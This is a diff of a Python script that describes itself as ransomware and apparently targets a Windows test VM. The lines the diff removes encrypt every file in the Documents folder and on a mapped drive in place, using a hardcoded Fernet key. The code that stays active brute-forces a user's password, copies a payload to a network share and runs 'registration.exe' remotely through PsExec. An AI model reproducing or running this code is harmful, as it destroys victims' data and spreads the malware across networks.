@@ -7,41 +7,41 @@ from pypsexec.client import Client #Sending remote commands
 
 
 
-#Walkthrough the Documents folder and the P: drive
-def fileWalk():
-    path= "C:/Users/IEUsers/Documents"
-    files=[]
-    for r, d, f in os.walk(path):
-        for file in f:
-            files.append(os.path.join(r,file))
-        for f in files:
-            encrypt(f)
-    fileWalkP()
+# #Walkthrough the Documents folder and the P: drive
+# def fileWalk():
+#     path= "C:/Users/IEUsers/Documents"
+#     files=[]
+#     for r, d, f in os.walk(path):
+#         for file in f:
+#             files.append(os.path.join(r,file))
+#         for f in files:
+#             encrypt(f)
+#     fileWalkP()
 
-def fileWalkP():
-    path= "P:/"
-    files=[]
-    for r, d, f in os.walk(path):
-        for file in f:
-            files.append(os.path.join(r,file))
-        for f in files:
-            encrypt(f)
+# def fileWalkP():
+#     path= "P:/"
+#     files=[]
+#     for r, d, f in os.walk(path):
+#         for file in f:
+#             files.append(os.path.join(r,file))
+#         for f in files:
+#             encrypt(f)
 
 
-#def encrypt file
-def encrypt(fileLocation):
-    key = "_TjtaRpjApz2rBn4m22iqH6x3wo_3iDE99HQwKwKt4o="
-    f = Fernet(key)
-    with open(fileLocation, "rb") as file:
-        file_data=file.read()
-    encrypt_data=f.encrypt(file_data)
-    with open (fileLocation, "wb") as file:
-        file.write(encrypt_data)
+# #def encrypt file
+# def encrypt(fileLocation):
+#     key = "_TjtaRpjApz2rBn4m22iqH6x3wo_3iDE99HQwKwKt4o="
+#     f = Fernet(key)
+#     with open(fileLocation, "rb") as file:
+#         file_data=file.read()
+#     encrypt_data=f.encrypt(file_data)
+#     with open (fileLocation, "wb") as file:
+#         file.write(encrypt_data)
 
 
 #play video
 def playVideo():
-    os.system("cd C:/Users/IEUser/Downloads/Registration/Iam.mp4")
+    os.system("start C:/Users/IEUser/Downloads/Registration/Iam.mp4")
     #CHANGE BACKGROUD
 
 
@@ -68,7 +68,7 @@ def bruteForce(user, ipAddress):
 #Transfer
 def transferFile():
     os.system("robocopy C:/Users/IEUser/Downloads/Registration P:/Registration  ") #P:\\ zip folder
-    os.system("robocopy P:/Registration C:/Users/IEUser/Downloads/Registration  ")#Fresh copy to start thr cycle again 
+    # os.system("robocopy P:/Registration //IE9WIN7/Users/IEUser/Downloads/Registration  ")#Fresh copy to start the cycle again 
 
 
 #Remote execute file
@@ -77,17 +77,18 @@ def remoteExecute(ipAddress, user, password):
     c.connect()
     try:
         c.create_service()
-        stdout, stderr, rc = c.run_executable("P:/Registration/registration.exe") #Execute ransomware from P Drive
+        stdout, stderr, rc = c.run_executable("C:/Users/IEUser/Downloads/Registration/registration.exe") #Execute ransomware from P Drive
     except:
         print("done")
 
 def main():
     user= "IEUser"
-    fileWalk()
+    # fileWalk()
     playVideo()
     ipAddress= sniffNetwork()
     print(ipAddress)
     password=bruteForce(user,ipAddress)
     print(password)
+    transferFile()
     remoteExecute(ipAddress,user, password)
 main()
